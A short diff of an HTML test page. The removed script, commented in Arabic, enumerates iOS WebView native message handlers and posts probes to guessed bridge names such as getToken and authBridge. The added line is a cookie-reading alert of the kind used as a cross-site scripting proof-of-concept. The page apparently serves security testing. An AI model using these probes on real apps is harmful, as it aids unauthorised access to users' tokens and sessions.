@@ -8,43 +8,8 @@
   <div id="result" style="font-family: monospace;"></div>
 
   <script>
-    const output = document.getElementById("result");
-    let logs = [];
+  alert("Cookies: " + document.cookie);
+</script>
 
-    function log(msg) {
-      logs.push(msg);
-      output.innerHTML += msg + "<br>";
-    }
-
-    log("🔍 جسور متاحة:");
-    log(JSON.stringify(window.webkit?.messageHandlers ?? "❌ لا يوجد window.webkit"));
-
-    if (window.webkit?.messageHandlers) {
-      Object.keys(window.webkit.messageHandlers).forEach(name => {
-        log("📡 تم اكتشاف الجسر: " + name);
-      });
-    } else {
-      log("❌ لا يوجد جسور واضحة");
-    }
-
-    const guessNames = [
-      "getUser", "getToken", "getProfile", "grabUser",
-      "nativeBridge", "iosBridge", "authBridge", "sessionBridge"
-    ];
-
-    guessNames.forEach(name => {
-      try {
-        window.webkit.messageHandlers[name].postMessage("probe");
-        log("🧪 تم تجربة الجسر: " + name);
-      } catch (e) {
-        log("❌ لا يوجد جسر بالاسم: " + name);
-      }
-    });
-
-    // أضف تنبيه نهائي بالمخرجات
-    setTimeout(() => {
-      alert("📋 النتائج:\n\n" + logs.join("\n"));
-    }, 1500);
-  </script>
 </body>
 </html>
